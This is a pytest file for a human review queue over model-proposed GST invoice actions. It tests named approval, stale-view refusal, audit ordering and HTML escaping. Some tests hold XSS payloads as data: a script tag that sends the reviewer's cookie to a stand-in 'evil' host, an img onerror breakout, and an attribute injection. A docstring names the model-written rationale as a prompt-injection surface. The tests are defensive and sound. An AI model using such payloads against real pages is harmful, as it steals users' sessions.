"""Tests for the review queue and the surface over it.

The queue is the control the architecture leans on, so these tests are written
as attacks on it rather than demonstrations of it: approve without a name,
approve a page that has gone stale, approve twice, override to an action nobody
enumerated, and put a script tag where a model's rationale goes.
"""

from __future__ import annotations

from dataclasses import replace
from datetime import UTC, datetime
from decimal import Decimal

import pytest
from fastapi.testclient import TestClient

from gst_recon.api import queue as review_queue
from gst_recon.api.app import CSP, create_app
from gst_recon.api.html import Safe, tag, text
from gst_recon.api.queue import (
    AlreadyResolvedError,
    ReviewAction,
    ReviewError,
    ReviewItem,
    ReviewQueue,
    StaleViewError,
    UnknownItemError,
    UnnamedApproverError,
)
from gst_recon.audit import AuditLog
from gst_recon.domain.records import EvidenceItem
from gst_recon.domain.taxonomy import ImsAction
from gst_recon.gstn import FakeGspClient, SubmitOutcome

NOW = datetime(2026, 7, 10, 9, 0, tzinfo=UTC)
RULESET = "2026.07"


def _item(
    exception_id: str = "E00001-X140P",
    action: ImsAction = ImsAction.REJECT,
    amount: str = "77920.90",
    rationale: str = "The supplier never filed this document in the period.",
    sequence: int = 0,
) -> ReviewItem:
    return ReviewItem(
        exception_id=exception_id,
        exception_class="MISSING_IN_2B",
        supplier_gstin="27AAAPA1234A1Z5",
        invoice_number="INV/2026/001",
        amount_at_risk=Decimal(amount),
        proposed_action=action,
        reasons=("reject is irreversible within the cycle", "value above the ceiling"),
        rationale=rationale,
        confidence=0.92,
        evidence=(
            EvidenceItem(
                tool_call_id="tc00-query_gstr2b",
                tool_name="query_gstr2b",
                claim="GSTR-2B holds no document with this number for 07-2026",
            ),
        ),
        audit_sequence=sequence,
        detail="book line has no counterpart in 2B",
    )


def _queue(*items: ReviewItem, client=None) -> ReviewQueue:
    """A queue whose audit log already holds the proposal entries."""
    audit = AuditLog()
    seeded = []
    for item in items:
        entry = audit.append(
            exception_id=item.exception_id,
            action=item.proposed_action.value,
            requires_human=True,
            reasons=item.reasons,
            recorded_at=NOW,
            ruleset_version=RULESET,
            confidence=item.confidence,
            amount_at_risk=item.amount_at_risk,
        )
        seeded.append(replace(item, audit_sequence=entry.sequence))

    review = ReviewQueue(
        audit=audit,
        client=client or FakeGspClient(),
        taxpayer_gstin="27AAPFU0939F1ZV",
        return_period="07-2026",
        ruleset_version=RULESET,
        days_to_cutoff=4,
    )
    for item in seeded:
        review.add(item)
    return review


def _approve(review: ReviewQueue, item: ReviewItem, **overrides):
    arguments = {
        "approver": "A. Reviewer",
        "review_action": ReviewAction.APPROVE,
        "confirmation": review.get(item.exception_id).confirmation(),
        "recorded_at": NOW,
    }
    arguments.update(overrides)
    return review.resolve(item.exception_id, **arguments)


# --------------------------------------------------------------------------
# Escaping, which is a type property rather than a habit


def test_a_plain_string_child_is_escaped() -> None:
    assert tag("p", "<script>alert(1)</script>") == "<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>"


def test_already_safe_markup_passes_through() -> None:
    assert tag("div", tag("b", "hello")) == "<div><b>hello</b></div>"


def test_attribute_values_are_quoted_and_escaped() -> None:
    rendered = tag("a", "x", href='" onmouseover="steal()')
    assert 'onmouseover="steal()"' not in rendered
    assert "&quot;" in rendered


def test_text_marks_an_escaped_string_safe() -> None:
    escaped = text("<b>")
    assert isinstance(escaped, Safe)
    assert tag("p", escaped) == "<p>&lt;b&gt;</p>"


# --------------------------------------------------------------------------
# The queue's refusals


def test_an_approval_must_carry_a_name() -> None:
    """An unattributed approval is indistinguishable from none at all."""
    item = _item()
    review = _queue(item)
    with pytest.raises(UnnamedApproverError):
        _approve(review, item, approver="   ")
    assert review.pending()


def test_an_approval_is_bound_to_what_was_displayed() -> None:
    """The failure this prevents needs no attacker.

    A cycle re-run between loading the page and pressing the button is enough
    to change the proposal underneath a reviewer, and approving text nobody
    read is the one thing a human gate must not allow.
    """
    item = _item()
    review = _queue(item)
    with pytest.raises(StaleViewError):
        _approve(review, item, confirmation="whatever the page said earlier")
    assert review.pending()


def test_the_confirmation_changes_when_the_proposal_does() -> None:
    original = _item()
    assert replace(original, proposed_action=ImsAction.ACCEPT).confirmation() != (
        original.confirmation()
    )
    assert replace(original, rationale="a different reason").confirmation() != (
        original.confirmation()
    )
    assert replace(original, amount_at_risk=Decimal("1.00")).confirmation() != (
        original.confirmation()
    )


def test_the_confirmation_is_stable_for_an_unchanged_case() -> None:
    assert _item().confirmation() == _item().confirmation()


def test_deciding_twice_is_refused_and_submits_once() -> None:
    item = _item()
    client = FakeGspClient()
    review = _queue(item, client=client)
    _approve(review, item)
    calls = client.calls

    with pytest.raises(AlreadyResolvedError):
        _approve(review, item)
    assert client.calls == calls


def test_an_override_outside_the_enumerated_set_is_refused() -> None:
    """The reviewer's vocabulary is closed, exactly as the agent's is."""
    item = _item()
    review = _queue(item)
    with pytest.raises(ReviewError):
        _approve(
            review,
            item,
            review_action=ReviewAction.OVERRIDE,
            override=ImsAction.NO_ACTION,
        )
    assert review.pending()


def test_an_override_with_no_action_named_is_refused() -> None:
    item = _item()
    review = _queue(item)
    with pytest.raises(ReviewError):
        _approve(review, item, review_action=ReviewAction.OVERRIDE, override=None)


def test_an_unknown_case_cannot_be_decided() -> None:
    review = _queue(_item())
    with pytest.raises(UnknownItemError):
        review.resolve(
            "E99999-NOPE",
            approver="A. Reviewer",
            review_action=ReviewAction.APPROVE,
            confirmation="x",
            recorded_at=NOW,
        )


# --------------------------------------------------------------------------
# What an approval actually does


def test_approving_records_the_person_and_then_submits() -> None:
    item = _item()
    client = FakeGspClient()
    review = _queue(item, client=client)
    outcome = _approve(review, item)

    assert outcome.final_action is ImsAction.REJECT
    assert outcome.entry.approver == "A. Reviewer"
    assert outcome.entry.requires_human is False
    assert outcome.submission is not None
    assert outcome.submission.outcome is SubmitOutcome.APPLIED
    assert review.pending() == []


def test_the_record_survives_a_portal_that_fails() -> None:
    """Proof of the ordering, not of the happy path.

    The audit entry is written before the portal is called, so a portal that
    throws leaves a recorded decision with an unknown outcome -- which a person
    can find and settle. The other order would leave nothing at all.
    """

    class Exploding:
        def submit_ims_action(self, submission):  # noqa: ARG002 -- the signature is the contract
            raise RuntimeError("portal unreachable")

    item = _item()
    review = _queue(item, client=Exploding())
    with pytest.raises(RuntimeError):
        _approve(review, item)

    entries = review.audit.for_exception(item.exception_id)
    assert len(entries) == 2
    assert entries[-1].approver == "A. Reviewer"


def test_the_proposal_is_superseded_rather_than_rewritten() -> None:
    """The log has to show what was proposed as well as what was agreed."""
    item = _item()
    review = _queue(item)
    original = review.audit.entries[item.audit_sequence]
    original_digest = original.digest()

    outcome = _approve(review, item)
    superseded = review.audit.entries[item.audit_sequence]

    assert superseded.digest() == original_digest
    assert superseded.action == item.proposed_action.value
    assert superseded.requires_human is True
    assert superseded.superseded_by == outcome.entry.sequence
    assert review.audit.verify_chain() == (True, "chain intact")


def test_holding_records_a_decision_and_touches_no_portal() -> None:
    item = _item()
    client = FakeGspClient()
    review = _queue(item, client=client)
    outcome = review.resolve(
        item.exception_id,
        approver="A. Reviewer",
        review_action=ReviewAction.HOLD,
        confirmation=item.confirmation(),
        recorded_at=NOW,
    )

    assert outcome.final_action is ImsAction.PENDING
    assert outcome.submission is None
    assert client.calls == 0


def test_a_reviewer_may_overturn_the_proposal() -> None:
    """The gate exists so a person can disagree, not only so they can consent."""
    item = _item(action=ImsAction.REJECT)
    review = _queue(item)
    outcome = _approve(
        review,
        item,
        review_action=ReviewAction.OVERRIDE,
        override=ImsAction.ACCEPT,
        note="supplier filed late, credit is genuine",
    )

    assert outcome.final_action is ImsAction.ACCEPT
    assert any("supplier filed late" in reason for reason in outcome.entry.reasons)


def test_the_worklist_puts_irreversible_and_expensive_cases_first() -> None:
    """A reviewer with limited time should spend it where being wrong costs most."""
    small_reject = _item("E-A", ImsAction.REJECT, "100.00")
    big_accept = _item("E-B", ImsAction.ACCEPT, "900000.00")
    small_accept = _item("E-C", ImsAction.ACCEPT, "50.00")
    review = _queue(small_accept, big_accept, small_reject)

    assert [item.exception_id for item in review.pending()] == ["E-A", "E-B", "E-C"]


# --------------------------------------------------------------------------
# The HTTP surface


@pytest.fixture
def served():
    item = _item()
    client = FakeGspClient()
    review = _queue(item, client=client)
    app = create_app(review, clock=lambda: NOW)
    return TestClient(app), review, item, client


def test_a_rationale_that_is_a_script_tag_is_rendered_as_text(served) -> None:
    """The rationale is model-written, and in Tier 3 the model has read
    supplier free text. This is the injection surface, and the reviewer's
    browser is where a script would run."""
    hostile = _item(rationale="<script>fetch('//evil/'+document.cookie)</script>")
    review = _queue(hostile)
    http = TestClient(create_app(review, clock=lambda: NOW))

    page = http.get(f"/review/{hostile.exception_id}").text
    assert "<script" not in page.lower()
    assert "&lt;script&gt;" in page


def test_a_hostile_evidence_claim_cannot_break_out_of_its_element() -> None:
    hostile = _item()
    hostile = replace(
        hostile,
        evidence=(
            EvidenceItem(
                tool_call_id='tc00"><img src=x onerror=alert(1)>',
                tool_name="query_gstr2b",
                claim='"><img src=x onerror=alert(1)>',
            ),
        ),
    )
    review = _queue(hostile)
    http = TestClient(create_app(review, clock=lambda: NOW))

    page = http.get(f"/review/{hostile.exception_id}").text
    assert "<img" not in page.lower()
    assert "onerror" not in page.lower() or "&lt;img" in page


def test_no_page_carries_a_script_and_every_page_says_so(served) -> None:
    http, _review, item, _client = served
    for path in ("/", f"/review/{item.exception_id}"):
        response = http.get(path)
        assert response.status_code == 200
        assert "<script" not in response.text.lower()
        assert response.headers["content-security-policy"] == CSP


def test_reading_every_page_decides_nothing(served) -> None:
    """No mutating handler sits behind a GET, so a prefetch cannot approve."""
    http, review, item, client = served
    for path in ("/", f"/review/{item.exception_id}", "/api/queue", "/api/audit", "/healthz"):
        assert http.get(path).status_code == 200
    assert len(review.pending()) == 1
    assert client.calls == 0


def test_posting_an_approval_records_it_and_redirects(served) -> None:
    http, review, item, client = served
    response = http.post(
        f"/review/{item.exception_id}/approve",
        data={"approver": "A. Reviewer", "confirmation": item.confirmation()},
        follow_redirects=False,
    )

    assert response.status_code == 303
    assert review.resolved[item.exception_id].approver == "A. Reviewer"
    assert client.calls == 1


def test_posting_a_stale_confirmation_is_a_conflict(served) -> None:
    http, review, item, client = served
    response = http.post(
        f"/review/{item.exception_id}/approve",
        data={"approver": "A. Reviewer", "confirmation": "stale"},
    )

    assert response.status_code == 409
    assert review.pending()
    assert client.calls == 0


def test_posting_without_a_name_is_rejected(served) -> None:
    http, review, item, client = served
    response = http.post(
        f"/review/{item.exception_id}/approve",
        data={"approver": "", "confirmation": item.confirmation()},
    )

    assert response.status_code == 400
    assert review.pending()
    assert client.calls == 0


def test_a_handmade_request_cannot_invent_an_action(served) -> None:
    """The form offers a closed set; a request built by hand meets the same one."""
    http, review, item, client = served
    response = http.post(
        f"/review/{item.exception_id}/override",
        data={
            "approver": "A. Reviewer",
            "confirmation": item.confirmation(),
            "override": "DELETE_EVERYTHING",
        },
    )

    assert response.status_code == 400
    assert review.pending()
    assert client.calls == 0


def test_an_override_to_a_real_but_disallowed_action_is_refused(served) -> None:
    http, review, item, client = served
    response = http.post(
        f"/review/{item.exception_id}/override",
        data={
            "approver": "A. Reviewer",
            "confirmation": item.confirmation(),
            "override": ImsAction.NO_ACTION.value,
        },
    )

    assert response.status_code == 400
    assert review.pending()
    assert client.calls == 0


def test_deciding_an_unknown_case_over_http_is_a_404(served) -> None:
    http, _review, _item, _client = served
    response = http.post(
        "/review/E99999-NOPE/approve",
        data={"approver": "A. Reviewer", "confirmation": "x"},
    )
    assert response.status_code == 404


def test_a_decided_case_shows_what_was_done(served) -> None:
    http, _review, item, _client = served
    http.post(
        f"/review/{item.exception_id}/approve",
        data={"approver": "A. Reviewer", "confirmation": item.confirmation()},
    )

    page = http.get(f"/review/{item.exception_id}").text
    assert "A. Reviewer" in page
    assert "APPLIED" in page


def test_the_json_queue_reports_what_is_waiting(served) -> None:
    http, _review, item, _client = served
    payload = http.get("/api/queue").json()

    assert payload["pending"] == 1
    assert payload["items"][0]["exception_id"] == item.exception_id
    assert payload["items"][0]["irreversible"] is True
    assert payload["amount_at_risk"] == "77920.90"


def test_the_audit_endpoint_reports_the_chain_state(served) -> None:
    http, review, item, _client = served
    http.post(
        f"/review/{item.exception_id}/approve",
        data={"approver": "A. Reviewer", "confirmation": item.confirmation()},
    )

    payload = http.get("/api/audit").json()
    assert payload["intact"] is True
    assert payload["entries"] == len(review.audit)


def test_the_override_set_is_the_one_the_form_offers(served) -> None:
    """A mismatch here would be a control that looks closed and is not."""
    http, _review, item, _client = served
    page = http.get(f"/review/{item.exception_id}").text
    for action in review_queue.OVERRIDES:
        assert f'value="{action.value}"' in page
    assert ImsAction.NO_ACTION.value not in page
